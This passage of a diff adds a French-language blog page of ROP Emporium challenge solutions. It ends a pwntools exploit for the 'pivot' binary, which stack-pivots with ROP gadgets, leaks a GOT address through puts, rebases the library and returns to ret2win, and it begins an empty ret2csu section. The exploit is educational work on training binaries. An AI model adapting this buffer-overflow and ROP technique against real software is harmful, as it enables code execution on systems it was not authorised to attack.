+</span>
+<span class="c1"># 0x0000000000400a2d: pop rsp; pop r13; pop r14; pop r15; ret; 
+</span><span class="n">gad_pop_rsp_r13_r14_r15</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400a2d</span><span class="p">)</span>
+
+<span class="c1"># 0x0000000000400a33: pop rdi; ret; 
+</span><span class="n">gad_pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400a33</span><span class="p">)</span>
+
+<span class="c1">### GET PIVOT ADDRESS ###
+</span><span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'pivot: '</span><span class="p">)</span>
+<span class="n">addr_pivot</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f"Adresse du pivot: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_pivot</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+
+<span class="c1">### ROP AFTER PIVOT ###
+</span><span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
+
+
+<span class="n">rop_pivot</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+<span class="n">rop_pivot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">])</span>
+<span class="n">rop_pivot</span> <span class="o">+=</span> <span class="n">gad_pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">])</span>
+<span class="n">rop_pivot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span>
+<span class="n">rop_pivot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop_pivot</span><span class="p">)</span>
+
+<span class="c1">### ROP FOR PIVOT ###
+</span><span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
+
+<span class="n">padding</span>  <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">40</span>
+<span class="n">rop_smash</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">rop_smash</span> <span class="o">+=</span> <span class="n">gad_pop_rsp_r13_r14_r15</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_pivot</span><span class="p">)</span>
+
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop_smash</span><span class="p">)</span>
+
+
+<span class="c1">### GET THE LEAK
+</span>
+<span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'libpivot</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">addr_foothold_function</span> <span class="o">=</span> <span class="n">u64</span><span class="p">((</span><span class="n">target</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span><span class="o">+</span><span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">f"Adresse de foothold_function dans le bin : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_foothold_function</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1">### CALCULATE SOME OFFSETS
+</span>
+<span class="n">libpivot</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">addr_foothold_function</span> <span class="o">-</span> <span class="n">libpivot</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'foothold_function'</span><span class="p">]</span> 
+<span class="n">addr_ret2win</span> <span class="o">=</span> <span class="n">libpivot</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">]</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b'USELESS!'</span><span class="p">)</span>
+
+<span class="n">target</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
+<span class="n">rop_ret2win</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_ret2win</span><span class="p">)</span>
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop_ret2win</span><span class="p">)</span>
+
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<h1 id="ret2csu">ret2csu</h1>
+
+<blockquote>
+  <p><em>We’re back in ret2win territory, but this time with no useful gadgets. How will we populate critical registers without them?</em></p>
+</blockquote>
+
+<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/ret2csu.html">ici</a></p>
+
+<h4 id="solution-7">solution</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">### Nothing to see here...
+</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/ropemporium/" hidden></a>
+</article>
+      </div>
+    </main><!-- ici y'aura peut être des trucs --></body>
+
+</html>
